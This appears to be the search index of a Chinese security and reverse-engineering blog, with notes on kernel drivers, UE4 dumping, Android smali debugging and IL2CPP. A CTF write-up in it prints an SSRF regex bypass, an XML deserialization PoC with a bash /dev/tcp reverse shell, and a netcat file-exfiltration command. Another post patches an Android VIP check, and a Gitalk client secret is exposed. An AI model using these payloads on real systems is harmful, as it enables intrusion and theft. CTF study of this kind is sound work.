{"pages":[{"title":"","text":"🎈🎈微笑墙🎈🎈 彭小苒 唐艺昕 李一桐 gakki 图片搜集于互联网，侵权请留言，马上处理😊。","link":"/album/index.html"},{"title":"","text":"申请友链须知 原则上只和技术类博客交换，但不包括含有和色情、暴力、政治敏感的网站。 不和剽窃、侵权、无诚信的网站交换，优先和具有原创作品的网站交换。 申请请提供：站点名称、站点链接、站点描述、logo或头像（不要设置防盗链）。 排名不分先后，刷新后重排，更新信息后请留言告知。 会定期清理很久很久不更新的、不符合要求的友链，不再另行通知。 本站不存储友链图片，如果友链图片换了无法更新。图片裂了的会替换成默认图，需要更换的请留言告知。 本站友链信息如下，申请友链前请先添加本站信息： 网站图标：https://blog.1024w.com/img/avatar.jpg 网站名称：布墨 网站地址：https://blog.1024w.com 网站简介：技术分享,学习笔记。 加载中，稍等几秒...","link":"/friend/index.html"},{"title":"","text":"&nbsp;&nbsp;听听音乐 音乐播放器由mePlayer提供，布局参照网友博客所作，感谢作者的辛勤付出。更多音乐分享请查看歌单。 &nbsp;&nbsp;看看视频 ->点击以下条目开始播放视频,向下滑动查看更多","link":"/media/index.html"},{"title":"","text":"待添加","link":"/about/index.html"},{"title":"","text":"来而不往非礼也畅所欲言，有留必应","link":"/message/index.html"},{"title":"音乐歌单收藏","text":"温馨提示：选择喜欢的音乐双击播放，由于版权原因部分不能播放。如果喜欢歌单收藏一下，去网易云都能播放哟！","link":"/music/index.html"},{"title":"","text":"碎碎念 tips：github登录后按时间正序查看、可点赞加❤️、本插件地址..「+99次查看」 碎碎念加载中，请稍等... $.getScript(\"/js/gitalk_self.min.js\", function () { var gitalk = new Gitalk({ clientID: '46a9f3481b46ea0129d8', clientSecret: '79c7c9cb847e141757d7864453bcbf89f0655b24', id: '666666', repo: 'issue_database', owner: 'removeif', admin: \"removeif\", createIssueManually: true, distractionFreeMode: false }); gitalk.render('comment-container1'); });","link":"/self-talking/index.html"}],"posts":[{"title":"2020-kcft-秋季赛-1.至暗时刻WP","text":"2020-kcft-秋季赛-至暗时刻WP - 布墨 相识 http://121.36.145.157:8088/getimage?url=https://bbs.pediy.com/upload/attach/202009/236762_Y76C73KQC7MG83G.jpg http://121.36.145.157:8088/loadConfig?url=x.xml 相知 链接1 经测试会加载url参数的地址 链接2 返回not allow ip 猜测需要过这个ip校验发现第一个链接会校验url参数的格式^(http|https):\\/\\/[^?#\\/]\\.pediy\\.com\\/.绕过正则： http://121.36.145.157:8088/getimage?url=http://localhost%253a8088%253f.pediy.com/ http://localhost:8080?.pediy.com/ localhost:8080? 俩次url编码 （浏览器请求的时候默认就是一次url编码，服务器收到会解码一次 所以需要俩次 相杀 java写的服务，然后有个FileSystemXmlApplicationContext猜测是CVE-2019-2725的洞 构建poc反弹shell 链接上之后拿到.jar文件 反编译即可 POC 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt; &lt;constructor-arg &gt; &lt;list&gt; &lt;value&gt;bash&lt;/value&gt; &lt;value&gt;-c&lt;/value&gt; &lt;value&gt;&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/127.0.0.1/9090 0&gt;&amp;1]]&gt;&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt;&lt;/beans&gt; 遇到的问题 怎么从靶机中下载文件 主机：nc -lvnp prot &gt; 1.jar 靶机：cat x.jar&gt;/dev/tcp/ip/prot 出题当天晚上我曾用poc链接上 后来断了 那天晚上就一直连接不上了。。不知道为什么，第二天莫名其妙的可以了。。。 参考文章:CVE-2019-2725 二次反序列化FileSystemXmlApplicationContext Gadget POC","link":"/2020/11/18/2020-kcft-%E7%A7%8B%E5%AD%A3%E8%B5%9B-1-%E8%87%B3%E6%9A%97%E6%97%B6%E5%88%BBWP/"},{"title":"WinDbg","text":"命令 !idt 查看中断表 dt _KTSS64 !process 0 0 查看所有进程 快捷键","link":"/2020/08/26/WinDbg/"},{"title":"minifilter-学习笔记1","text":"Minifilter与legacy filter区别 新一代的文件过滤框架：Minifilter 比sfilter加载顺序更易控制，altitude被绑定到合适的位置。 可卸载能力。 Callback模型仅需要处理操作的能力。 兼容性更好。 名字处理更容易 安装方式（.inf/动态加载） 通信方式（port） 同样遵循IRQL,锁等内核开发通用机制 FltCreateFile/ZwCreateFile Altitude值：20000-429999 每个minfilter驱动必须有一个叫做altitude的唯一标识符，一个minifilter驱动的alititude定义了它加载时在I/O栈中相对其他minifilter驱动的位置。值越小，栈中位置就越低 FSFilter Anti-Virus 320000-329999 此组包括在文件I/O期间探测并杀毒的过滤驱动. FSFilter Encryption 140000-149999 此组包括在文件I/O期间加密和解密数据的过滤驱动. minifilter框架（1） 123456789101112131415161718typedef struct _FLT_REGISTRATION { USHORT Size; USHORT Version; FLT_REGISTRATION_FLAGS Flags; const FLT_CONTEXT_REGISTRATION *ContextRegistration; const FLT_OPERATION_REGISTRATION *OperationRegistration; PFLT_FILTER_UNLOAD_CALLBACK FilterUnloadCallback; PFLT_INSTANCE_SETUP_CALLBACK InstanceSetupCallback; PFLT_INSTANCE_QUERY_TEARDOWN_CALLBACK InstanceQueryTeardownCallback; PFLT_INSTANCE_TEARDOWN_CALLBACK InstanceTeardownStartCallback; PFLT_INSTANCE_TEARDOWN_CALLBACK InstanceTeardownCompleteCallback; PFLT_GENERATE_FILE_NAME GenerateFileNameCallback; PFLT_NORMALIZE_NAME_COMPONENT NormalizeNameComponentCallback; PFLT_NORMALIZE_CONTEXT_CLEANUP NormalizeContextCleanupCallback; PFLT_TRANSACTION_NOTIFICATION_CALLBACK TransactionNotificationCallback; PFLT_NORMALIZE_NAME_COMPONENT_EX NormalizeNameComponentExCallback; PFLT_SECTION_CONFLICT_NOTIFICATION_CALLBACK SectionNotificationCallback;} FLT_REGISTRATION, *PFLT_REGISTRATION; IRP_PAGING_IO 是系统发起的IO操作 IRP_NOCACHE 设置标记 FILE_NO_INTERMEDIATE_BUFFERING： App-&gt;IO-&gt;FSD-&gt;DISK IRP_CACHE: 用户默认设置流程：App-&gt;IO-&gt;FSD-&gt;CC(缓存管理器)-&gt;MM(内存管理器)(-&gt;FSD-&gt;DISK); IRP_XXX_PAGING_IO: MM-&gt;FSD-&gt;DISK inf class:https://docs.microsoft.com/zh-tw/windows-hardware/drivers/ifs/file-system-filter-driver-classes-and-class-guids 参考文章:FLT_REGISTRATION结构体","link":"/2020/10/27/minifilter-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"},{"title":"vt学习笔记-1(基础)","text":"VT是什么？R0 - R3VT R-1虚拟化-&gt;硬件物理资源（寄存器）VT是虚拟化，虚拟硬件物理资源 VT的三种方式 VT-X 虚拟化CPU 可以虚拟化-中断，异常，内存，一些寄存器指令 VT-D 虚拟化IO 虚拟化外部设备 嵌入式，服务器 VT-C 虚拟化网络 服务器 VT host与guest之间的关系 Host端 VT VMM 虚拟化管理guest端 操作系统，软件 VN VMX是 VT-X架构 虚拟机能有几个 每一个核能有一个虚拟机，每一个核只能绑定一个vmcs 怎么退到VT管理器？ 主动触发：VT框架在使用的时候，必须设置的被动触发：VT设置过需要拦截的，可选 VT双机调试搭建.VMX添加","link":"/2020/08/27/vt%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1(%E5%9F%BA%E7%A1%80)/"},{"title":"内核逆向分析中有趣的技巧","text":"判断地址是否有效","link":"/2020/09/27/%E5%86%85%E6%A0%B8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B8%AD%E6%9C%89%E8%B6%A3%E7%9A%84%E6%8A%80%E5%B7%A7/"},{"title":"常用代码笔记 - 获取系统版本号","text":"1234567891011121314151617181920212223242526272829303132333435typedef enum _ENUM_WINDOWS_VERSION{ WINDOWS_7 = 0x0610, WINDOWS_7_SP1 = 0x0611, WINDOWS_8 = 0x0620, WINDOWS_8_1 = 0x0630, WINDOWS_10 = 0x0A00,hbnjmbn WINDOWS_10_RS1 = 0x0A01, // Anniversary update WINDOWS_10_RS2 = 0x0A02, // Creators update WINDOWS_10_RS3 = 0x0A03, // Fall creators update WINDOWS_10_RS4 = 0x0A04, // Spring creators update WINDOWS_10_RS5 = 0x0A05, // October 2018 update} ENUM_WINDOWS_VERSION;RTL_OSVERSIONINFOEXW stOSVersionInfo = { 0 };stOSVersionInfo.dwOSVersionInfoSize = sizeof(stOSVersionInfo);status = RtlGetVersion((PRTL_OSVERSIONINFOW)&amp;stOSVersionInfo);if (!NT_SUCCESS(status)) return status;ULONG ulWindowsVersion = (stOSVersionInfo.dwMajorVersion &lt;&lt; 8) | (stOSVersionInfo.dwMinorVersion &lt;&lt; 4) | stOSVersionInfo.wServicePackMajor;switch (ulWindowsVersion){ case WINDOWS_7: case WINDOWS_7_SP1: case WINDOWS_10: case WINDOWS_10_RS1: case WINDOWS_10_RS2: case WINDOWS_10_RS3: case WINDOWS_10_RS4: default: break;}","link":"/2020/09/27/%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E5%8F%B7/"},{"title":"记录几个vscode常用快捷键","text":"markdownlint 预览快捷键 Ctrl+Shilt+V PicGo（很棒的图床插件） 从剪切板上传图片：Ctrl + Alt + U 从本地文件夹上传图片：Ctrl + Alt + E 从输入框上传图片：Ctrl + Alt + O","link":"/2020/09/10/%E8%AE%B0%E5%BD%95%E5%87%A0%E4%B8%AAvscode%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"title":"调试与反调试","text":"嗨，请准确无误地输入密码查看哟！ ","link":"/2020/09/10/%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"title":"驱动内核常用api","text":"Api PsLookupProcessByProcessId 根据ProcessId获取EProcess结构体 ObDereferenceObject(PEProcess) 解引用，修改eprocess的引用为0","link":"/2020/08/26/%E9%A9%B1%E5%8A%A8%E5%86%85%E6%A0%B8%E5%B8%B8%E7%94%A8api/"},{"title":"保护模式 - 1.CPU尝试","text":"CPU 架构 Risc架构 手机 嵌入式 优点：少耗电，使用的时间更长 指令集：定长 arm属于此架构 Cisc架构 U V I 低功耗省电 指令集：变长 mov eax,dword ptr ds:[0x12345678] 执行流程： I5 ： 预取 ：取指针 译码1 ：获取原操作数 （指令） 译码2 ：计算地址或者寄存器 执行 ：发送CPU执行 回写 ：执行完回写 I7+ : 预取 ：取指针 译码1 ：获取原操作数 （指令） 取目标数 译码2 ：计算地址或者寄存器 执行 ：发送CPU执行 回写 ：执行完回写 支持多级流水线 这种CPU内部协同工作 叫做超级线程 CPU：预计算 不影响结果的前提 去执行,如下 VS并行执行 12xor eax,eaxxor ecx,ecx 逻辑地址+gtd.ds.base = 线性地址 线性地址拆成物理地址","link":"/2021/04/18/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/1.CPU%E5%B0%9D%E8%AF%95/"},{"title":"","text":"段描述符 S位：用于指定述符的类型（Descriptor Type）。当该位是“0”时，表示是一个系统段；为“1” 时，表示是一个代码段或者数据段（堆栈段也是特殊的数据段） DPL：表示述符的特权级（Descriptor Privilege Level，DPL）。这两位用于指定段的特权级。共 有 4 种处理器支持的特权级别，分别是 0、1、2、3，其中 0 是最高特权级别，3 是最低特权级别。 刚进入保护模式时执行的代码具有最高特权级 0（可以看成是从处理器那里继承来的），这些代码通 常都是操作系统代码，因此它的特权级别最高。每当操作系统加载一个用户程序时，它通常都会指 定一个稍低的特权级，比如 3 特权级。不同特权级别的程序是互相隔离的，其互访是严格限制的， 而且有些处理器指令（特权指令）只能由 0 特权级的程序来执行，为的就是安全 G位是粒度（Granularity）位，用于解释段界限的含义。当 G 位是“0”时，段界限以字节为 单位。此时，段的扩展范围是从 1 字节到 1 兆字节（1B～1MB）， 因 为 述 符 中 的 界 限 值 是 20 位 的。相反，如果该位是“1”， 那 么 ， 段 界 限 是 以 4KB 为单位的。这样，段的扩展范围是从 4KB 到 4GB。 P位 段是否有效 1有效 0无效 D/B 位是“默认的操作数大小”（Default Operation Size）或者“默认的堆栈指针大小”（Default Stack Pointer Size），又或者“上部边界”（Upper Bound）标志，主要为了能够在32位处理器上兼容运行16位保护模式的程序 D：代码段 用于指示指令中默认的 偏移地址和操作数尺寸。D＝0 表示指令中的偏移地址或者操作数是 16 位的；D=1，指示 32 位的 偏移地址或者操作数 B：堆栈段 用于在进行隐式的堆栈操作时，是使用 SP 寄存器还是 ESP 寄存器。隐式的堆栈操作指令包括 push、pop 和 call 等。如果该位是“0”，在访问那个段时， 使用 SP 寄存器，否则就是使用 ESP 寄存器。同时，B 位的值也决定了堆栈的上部边界。如果 B＝0， 那么堆栈段的上部边界（也就是 SP 寄存器的最大值）为 0xFFFF；如果 B＝1，那么堆栈段的上部 边界（也就是 ESP 寄存器的最大值）为 0xFFFFFFFF。 B=0 G=1 向上拓展 在普通数据段（ES,DS,FS,GS） B=0 是无效的 TYPE 字段共 4 位，用于指示述符的子类型，或者说是类别。 对于数据段来 说，这 4 位分别是 X、E、W、A 位； X E W A 描述符类别 含义 0 0 0 X 数据 只读 0 0 1 X 数据 读，写 0 1 0 X 数据 只读，向下扩展 0 0 0 X 数据 读，写，向下扩展 对于代码段来说，这 4 位则分别是 X、C、R、A 位; X C R A 描述符类别 含义 1 0 0 X 代码 只执行 1 0 1 X 代码 执行，读 1 1 0 X 代码 只执行，依从的代码段 1 1 1 X 代码 执行，读，依从的代码段 X 表示是否可以执行（eXecutable）。数据段总是不可执行的，X＝0；代码段总是 可以执行的，因此，X＝1 A 数据段和代码段的 A 位是已访问（Accessed）位，用于指示它所指向的段最近是否被访问过。 在述符创建的时候，应该清零。之后，每当该段被访问时，处理器自动将该位置“1”。对该位的 清零是由软件（操作系统）负责的，通过定期监视该位的状态，就可以统计出该段的使用频率。当 内存空间紧张时，可以把不经常使用的段退避到硬盘上，从而实现虚拟内存管理。 对于数据段来说 E 位指示段的扩展方向。E＝0 是向上扩展的，也就是向高地址方向扩展的，不包含limit， 是普通的数据段；E＝1 是向下扩展的，也就是向低地址方向扩展的，包含limit，通常是堆栈段 W 位指示段 的读写属性，或者说段是否可写，W＝0 的段是不允许写入的，否则会引发处理器异常中断；W＝1 的段是可以正常写入的 对于代码段来说 C 位指示段是否为特权级依从的（Conforming）。 C＝0 表示非依从的代码段， 这样的代码段可以从与它特权级相同的代码段调用，或者通过门调用；C＝1 表示允许从低特权级的 程序转移到该段执行。 R 位指示代码段是否允许 读出。代码段总是可以执行的，但是，为了防止程序被破坏，它是不能写入的。至于是否有读出的可 能，由 R 位指定。R＝0 表示不能读出，如果企图去读一个 R＝0 的代码段，会引发处理器异常中断； 如果 R＝1，则代码段是可以读出的，即可以把这个段的内容当成 ROM 一样使用。 码段是不可读的，那处理器怎么从里面取指令执行呢？事实上，这里的 R 属性并非用来限制处理器，而是用来限制程序和指令的行为。一个典型的例子是使用段超越前缀 “CS:”来访问代码段中的内容","link":"/2021/04/18/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/2.%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6/"},{"title":"","text":"原理 寻找GObject 根据字符串找到 GanvasObject 在GanvasObject所在函数中找到GObject","link":"/2021/07/10/UE4SDKDump/"},{"title":"","text":"根据exe的属性中的详细信息获取UE4的版本号并下载相应的UE4版本源码 版本为：4.22.2 获取 Gobject 地址 调试符号：FUObjectArray GUObjectArray; 在GameViewportClient.cpp下的Draw函数中 调用了PlayerController-&gt;IsPendingKill() IsPendingKill 中使用了 GUObjectArray因为IsPendingKill是内联函数所以IDA中就变成了 我们分析后就可以找到Gobject了 所以我需要定位到Draw函数，我们可以根据字符串CanvasObject来定位到函数 TUObjectArray ObjObjects address = 00007FF66023CA70 然后通过ObjObjects 就今天找到FUObjectArray GUObjectArrayObjObjects是FUObjectArray的一个属性 获取 GNames 地址 通过ByteProperty字符串找 dump name dump object需要修复： FUObjectArray 结构体 TUObjectArray 结构体 FUObjectItem 结构体 UObjectBase 结构体","link":"/2021/06/19/UE4dump/"},{"title":"","text":"github地址：https://github.com/fatedier/frp 配置 frps.ini 启动 frps 程序 配置 frpc.ini 启动 frpc 程序","link":"/2021/11/04/frp%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"},{"title":"","text":"拉去llvm源码git clone llvmsource cmake安装官网下载cmake https://cmake.org/download/ 新建build文件夹，进去之后cmake ../12cd buildcmake ../","link":"/2021/07/10/llvm%20build/"},{"title":"","text":"Android Killer 不反编译资源","link":"/2021/07/10/Android/AndroidKiller/"},{"title":"","text":"所需插件Android Studio 4.0及以上需要smalidea-0.06插件Android Studio 4.0以下需要smalidea-0.05插件安装插件流程 获取到对应的smalidea插件包 (https://bitbucket.org/JesusFreke/smalidea/downloads/) 选择AndroidStudio左上角File -&gt; Settings -&gt; Plugins -&gt; 齿轮图标 -&gt; Install Plugin from Disk -&gt; 选择插件包（不需要解压） 保存并重启IDEA即可 注意事项smali代码调试不能开启ddms（开启ddms会占用端口）需要开启系统调试开关或者修改配置文件添加android:debuggable=”true” (模拟器默认都是开启系统调试开关的,xposed+bdopenrer插件可以设置系统调试开关)端口占用问题 ，一般都是电脑端某个程序占用了调试端口8700操作流程 获取APK的smali文件 可以使用 androidkiller反编译 AndroidStudio打开已存在工程选择获取到的smali文件夹 设置项目属性：右击项目 -&gt; Mark Directory as -&gt; Sources Root 配置调试属性： -&gt; Run -&gt; Edit Configurations -&gt; add -&gt; remote 命令行启动调试模式 adb shell am start -D -n packagename/.MainActivity 查看进程ID ps |grep packagename 配置端口转发：adb forward tcp:8700 jdwp:pid 名称：PingAn1包名：com.testjava.jack.pingan1入口：com.testjava.jack.pingan1.MainActivity版本信息：Ver：1.0(1) SDK：19 TargetSDK：26 Activity： com.testjava.jack.pingan1.MainActivity Receiver： Service： Permission： https://www.jianshu.com/p/c9a7debfbf91","link":"/2021/07/10/Android/AndroidStudio%E8%B0%83%E8%AF%95smali%E4%BB%A3%E7%A0%81/"},{"title":"","text":"优点缺点调试大型APP容易崩，出错显示smali代码和apktool反编译后的不一样 流程 把要调试的APP拖入到jeb工具中 调试器APP，先打断点","link":"/2021/07/10/Android/jeb%E8%B0%83%E8%AF%95smali%E4%BB%A3%E7%A0%81/"},{"title":"","text":"通过 UI Automator Viewer工具找到提交按钮ID 通过ID找到界面 找到界面调用位置 发现一个函数调用了这个界面，直接return掉函数 全局搜索isVip 找到判断修改状态 直接 return true 修改getIsVip = 1","link":"/2021/11/05/Android/%E8%80%83%E9%A2%98/"},{"title":"","text":"参数数量不定的模板 Varuaduc Templates 1234567891011121314151617void print(){}template&lt;typename T,typename... Types&gt; // 接受 1+n个参数void print(const T&amp; firstArg,const Types&amp;... args){ count &lt;&lt; firstArg &lt;&lt; endl; // 打印第一个 print(args...); // 递归调用 当args数量是0的时候 就会调用空参数的print函数}template&lt;typename... Types&gt; // 接受 n个参数void print(const Types&amp;... args){}","link":"/2021/07/10/C++/Templates%E6%A8%A1%E6%9D%BF/"},{"title":"","text":"深入了解IL2CPP什么是IL2CPP 预先编译（AOT） An ahead-of-time (AOT) compiler 支持虚拟机的运行时库 A runtime library to support the virtual machine AOT编译器将由 .NET 输出的中间语言(IL)代码生成为C++代码。 运行时库提供服务和抽象，例如垃圾收集器、对线程和文件的独立平台访问以及内部调用的实现（直接修改托管数据结构的本机代码）。 AOT 编译器IL2CPP AOT 编译器实际的执行文件是 il2cpp.exe.在Windows平台你可以在Unity安装路径的 Editor\\Data\\il2cpp 目录中找到它。在 OSX 上，它位于 Unity安装路径的Contents/Frameworks/il2cpp/build 目录中。il2cpp.exe 应用程序是一个托管的可执行文件，完全用 C# 编写。在 IL2CPP 的开发过程中使用 .NET 和 Mono 编译器对其进行编译。 il2cpp.exe 应用程序接受使用 Unity 附带的 Mono 编译器编译的托管程序集，将这些程序集转换成C++代码，这些转换出的C++代码最终由部署目标平台上的C++编译器进行编译。 运行时库IL2CPP 技术的另一部分是对虚拟机提供支持的运行时库。几乎完全使用 C++ 代码实现了这个库（里面还是有一些和平台相关的代码使用了程序集）。运行时库称为 libil2cpp，它是作为一个静态库被链接到最终的游戏可执行文件中。这么做的一个主要的好处是可以使得整个IL2CPP技术是简单并且是可移植的 通过查看 随 Unity 提供的 libil2cpp 的头文件，可以找到有关如何组织 libil2cpp 代码的一些线索（ Windows 上头文件在Editor\\Data\\PlaybackEngines\\webglsupport\\BuildTools\\Libraries\\libil2cpp\\include 目录中，OSX 上的 Contents/Frameworks/il2cpp/libil2cpp 目录）。例如，由il2cpp产生的C++代码和libil2cpp之间的接口API，存在于codegen/il2cpp-codegen.h这个文件中。 运行时的一个关键部分是垃圾收集器。Unity 5中，我们使用libgc垃圾收集器。它是一个典型的贝姆垃圾收集器（Boehm-Demers-Weiser garbage collector）。（译注：相对使用保守垃圾回收策略）。然而我们的libil2cpp被设计成可以方便使用其他垃圾回收器。因此我们现在也在研究集成微软开源的垃圾回收器（Microsoft GC）。对于垃圾回收器这一点，我们会在后续的一篇中专门的讨论，这里就不多说了。 IL2CPP没做的事情没有尝试用 IL2CPP 重写 C# 标准库。 当你使用IL2CPP后端构建Unity项目的时候，所有在mscorlib.dll，System.dll等中的C#标准库和原来使用Mono编译时候的一模一样。 我们可以依赖健壮的且久经考验的C#标准库，所以当处理有关IL2CPP的bug的时候，我们可以很肯定的说问题出在AOT编译器或者运行时库这两个地方而不是在其他地方。","link":"/2021/11/04/il2cpp/1%20.%20%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3IL2CPP/"},{"title":"x64（学习笔记） - 1(汇编)","text":"要点 在x64中对32位的寄存器（比如eax,ebx）操作的时候（xor and mov 等）会影响64位的寄存器 。在x64中 mov eax,0x1 和 mov rax,0x1 俩个汇编的相等的 —零拓展 x64寻址和x32寻址不一样 call offset =call goto address - rip x64中 没有pushad pushaq 有 pushfq（eflags）; push cs, push ds 也没有了 vs x64项目使用汇编配置： 右键项目 -&gt; 生成依赖项 -&gt; 生成自定义 -&gt; 选中masm -&gt; 确定 右键.asm 属性 -&gt; 项类型选择 Microsoft Macro Assembler .asm文件 “;”在.asm 中 是注释 在asm中 16进制不能使用0x12345678 需要使用 12345678h 注意函数名和汇编指令冲突 函数名要加上extern_c 用c的规则来生成函数 12345678.code ; 在代码段MySub proto; 导入代码中的函数funcName proc; funcName 函数名 mov rax,rcx add rax,rdx retfuncName endp;函数结束end; 其他C++默认导出函数 会有返回值和参数的后缀","link":"/2021/07/10/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1(%E6%B1%87%E7%BC%96)/"},{"title":"","text":"代码生成之旅托管代码如何映射到C++代码在托管代码中的每个类，il2cpp.exe都会相应的生成一个有着C++定义的头文件和另外一个进行函数声明的头文件。举个例子，让我们看看UnityEngine.Vector3是如何被转换的。这个类的头文件名字叫UnityEngine_UnityEngine_Vector3.h。头文件名的组成：一开始是程序集名称（这里是UnityEngine），然后跟着命名空间（还是UnityEngine），最后是这个类型的名字（Vector3）。头文件的内容如下： 1234567891011// UnityEngine.Vector3struct Vector3_t78{ // System.Single UnityEngine.Vector3::x float ___x_1; // System.Single UnityEngine.Vector3::y float ___y_2; // System.Single UnityEngine.Vector3::z float ___z_3;}; il2cpp.exe对Vector3中三个成员都进行了转换，并且适当的处理了下变量名字（在成员变量前面添加下划线）以避免和保留字冲突。 UnityEngine_UnityEngine_Vector3MethodDeclarations.h头文件中则包含了Vector3这个类中所有相关的函数。比如我们熟悉的ToString函数： 12// System.String UnityEngine.Vector3::ToString()extern &quot;C&quot; String_t* Vector3_ToString_m2315 (Vector3_t78 * __this, MethodInfo* method) IL2CPP_METHOD_ATTR 请大家注意函数前面的注释，它能很好的反应出这个函数在原本托管代码中的名称。我时常发现这些个注释非常有用，能让我在C++代码中快速定位我想要寻找的函数。 由il2cpp.exe生成的函数代码有着以下一些有趣的特性： 所有的函数都不是成员函数。也就是说函数的第一个参数永远都是“this”指针。对于托管代码中的静态函数而言，IL2CPP会传递NULL作为第一个参数的值。这么做的好处是可以让il2cpp.exe转换代码的逻辑更加简单并且让代理函数的处理变得更加容易。 所有的函数还有一个额外的MethodInfo*参数用来描述函数的元信息。这些元信息是虚函数调用的关键。Mono使用和特定平台相关的方法来传递这些元信息。而IL2CPP出于可移植方面的考虑，并没有使用这些和平台相关的特定代码。所有的函数都被声明成了extern “C”，这样一来，在需要的时候我们就可以骗过C++编译器让其认为所有这些函数都是一个类型。 托管函数中的类型会被加上“_t”的后缀，函数则是加上“_m”后缀。最后我们加上一个唯一的数字来避免名字的重复。这些数字会随着项目代码的改变而改变，因此你不能把数字作为索引或者分析的参照。 前两个指针暗示着每个函数都至少有两个参数：“this”和“MethodInfo*”。这些额外的参数会加重整个调用的负担么？理论上是显而易见会加重的，但是我们在实际的测试中还没有发现这些参数对性能产生影响。 我们可以用Ctags工具跳转到ToString函数的定义部分，位于Bulk_UnityEngine_0.cpp文件中。在这个函数中的代码看上去和C#中Vector3::ToString()的代码一点也不像。但是当你用ILSpy 获取到Vector3::ToString()内部的代码后，你会发现C++代码和C#的IL代码是十分接近的。 为什么il2cpp.exe不针对每一个类中的函数生成单独的一个cpp文件呢？看看Bulk_UnityEngine_0.cpp，你会发现它有惊人的20,481行！之所以这么做的原因是我们发现C++编译器在处理大量的文件时会有问题。编译四千多个.cpp文件所用的时间远比编译相同的代码量，但是集中在80个.cpp文件中所用的时间要长得多。因此il2cpp.exe将所有类的函数定义放到一个组里并为这个组生成C++文件。 现在让我们看看函数声明头文件的第一行： 1#include &quot;codegen/il2cpp-codegen.h&quot; il2cpp-codegen.h 文件中包含了用来调用运行时库libil2cpp的代码。我们在稍后会谈谈调用运行时库的一些方法。 函数预处理代码段（Method prologues ）让我们再仔细的看下Vector3::ToString()函数的定义，你会发现函数中有一段特有的代码，这段代码是il2cpp.exe模板产生的，会插入到任何函数的最前面。 1234567StackTraceSentry _stackTraceSentry(&amp;Vector3_ToString_m2315_MethodInfo);static bool Vector3_ToString_m2315_init;if (!Vector3_ToString_m2315_init){ ObjectU5BU5D_t4_il2cpp_TypeInfo_var = il2cpp_codegen_class_from_type(&amp;ObjectU5BU5D_t4_0_0_0); Vector3_ToString_m2315_init = true;} 代码的第一行是一个局部变量StackTraceSentry。这个变量是用来跟踪托管代码的堆栈调用的。有了这个变量，IL2CPP就能在Environment.StackTrace调用中正确的打印出堆栈信息。是否产生这行代码是可选的，当你在il2cpp.exe命令行中加入–enable-stacktrace开关（因为我在WebGL选项中设置了“Enable Exceptions”为“Full”），就会生成这行代码。我们发现对于简单的小函数来说，这行代码的加入对代码的执行性能是有影响的。所以对于iOS或者其他有内置栈信息的平台来说，我们不会加入这行代码（而使用平台内置的栈信息）。但是对于WebGL来说，由于是在浏览器中执行，所以没有系统内置的栈信息可供调用。只能由il2cpp.exe加入以便托管代码的异常机制能正常运作。 代码序的第二部分是数组或者和类型相关的元信息的延迟加载。ObjectU5BU5D_t4实际代表的是System.Object[]。这部分代码永远只执行一次，如果这个类型的元信息已经加载过了，就直接跳过这段代码，啥也不做。所以这段代码不会带来性能下降。 那么这段代码是线程安全的嘛？如果两个线程都同时进行Vector3::ToString() 调用会发生什么？实际上，这不会有任何问题，因为libil2cpp运行时中的类型初始化函数是线程安全的。不管初始化函数被多少个线程同时调用，实际的执行是同一时间只能有一个线程的函数在执行。其他线程的函数都会被挂起直到当前的函数处理完成。所以总的来说，代码是线程安全的。 运行时检查函数的下个部分创建了一个object数组，将Vector3的x存在局部变量中，然后将这个变量装箱并加入到数组的零号位置中。下面是生成的C++代码： 12345678910111213// Create a new single-dimension, zero-based object arrayObjectU5BU5D_t4* L_0 = ((ObjectU5BU5D_t4*)SZArrayNew(ObjectU5BU5D_t4_il2cpp_TypeInfo_var, 3));// Store the Vector3::x field in a localfloat L_1 = (__this-&gt;___x_1);float L_2 = L_1;// Box the float instance, since it is a value type.Object_t * L_3 = Box(InitializedTypeInfo(&amp;Single_t264_il2cpp_TypeInfo), &amp;L_2);// Here are three important runtime checksNullCheck(L_0);IL2CPP_ARRAY_BOUNDS_CHECK(L_0, 0);ArrayElementTypeCheck (L_0, L_3);// Store the boxed value in the array at index 0*((Object_t **)(Object_t **)SZArrayLdElema(L_0, 0)) = (Object_t *)L_3; 在IL代码中没有出现的三个运行时检查是由il2cpp.exe加入的。 如果数组为空，NullCheck代码会抛出NullReferenceException异常。 如果数组的索引不正确，IL2CPP_ARRAY_BOUNDS_CHECK代码会抛出IndexOutOfRangeException异常。 如果加入数组的类型和数组类型不符合，ArrayElementTypeCheck代码会抛出ArrayTypeMismatchException异常。 这三个检查本来都是由.NET虚拟机完成的，在Mono实现中，不会插入这些个代码而是使用平台相关的信号机制来进行检查。对于IL2CPP，我们希望做到和平台无关的可移植性并且还要支持像WebGL这样的平台，所以不能使用Mono的机制，而是显示的插入检查代码。 这些检查会引起性能的下降么？在大多数情况下，我们并没有看到由此带来的性能损失，并且好处是我们提供了.NET虚拟机需要的安全保护机制。在某些特定的场合，比如在大量的循环中，我们确实看到了性能的下降。目前我们正在寻找方法在il2cpp.exe生成代码的时候减少这些运行时检查，各位有兴趣的可以继续关注。 